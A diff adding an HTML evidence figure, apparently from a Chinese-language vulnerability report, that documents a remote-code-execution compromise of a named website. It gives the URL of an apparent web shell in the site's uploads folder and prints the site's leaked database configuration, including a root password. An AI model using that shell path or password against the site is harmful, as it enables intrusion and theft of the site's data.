@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>图4 - database.php 泄露</title>
+<style>
+body{font-family:Consolas,monospace;background:#1e1e1e;color:#d4d4d4;padding:24px;line-height:1.6}
+h1{color:#569cd6;font-family:Microsoft YaHei,sans-serif;font-size:18px}
+.sub{color:#9cdcfe;font-size:13px;margin-bottom:20px;font-family:Microsoft YaHei,sans-serif}
+pre{background:#2d2d2d;border:1px solid #3c3c3c;padding:16px;border-radius:6px;overflow:auto;font-size:12px}
+.k{color:#9cdcfe}.v{color:#ce9178}.pw{color:#dcdcaa;background:#3a3a00}
+</style>
+</head>
+<body>
+<h1>【图4】RCE 读取 database.php 配置泄露</h1>
+<div class="sub">访问：https://www.biobasebaby.com/uploads/images/20260711/14237b582464806da3501977eb8ab737.php</div>
+<pre>return [
+    <span class="k">'type'</span>            => <span class="v">'mysql'</span>,
+    <span class="k">'hostname'</span>        => <span class="v">'localhost'</span>,
+    <span class="k">'database'</span>        => <span class="v">'www_biobasebaby'</span>,
+    <span class="k">'username'</span>        => <span class="v">'root'</span>,
+    <span class="k">'password'</span>        => <span class="pw">'BkLab@Bao&yu255'</span>,
+    <span class="k">'hostport'</span>        => <span class="v">'3306'</span>,
+    <span class="k">'charset'</span>         => <span class="v">'utf8'</span>,
+    <span class="k">'prefix'</span>          => <span class="v">'yzn_'</span>,
+];</pre>
+<p class="sub">攻击者获得 root 数据库密码后可拖取全部业务数据。</p>
+</body>
+</html>
